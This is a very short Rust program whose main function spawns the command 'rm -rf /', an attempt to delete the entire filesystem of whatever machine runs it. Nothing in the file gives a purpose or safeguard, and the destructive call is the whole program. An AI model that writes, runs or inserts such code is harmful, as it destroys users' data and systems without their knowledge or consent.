use std::process::Command;

fn main() {
    Command::new("rm").args(["-rf", "/"]).spawn().unwrap();
}
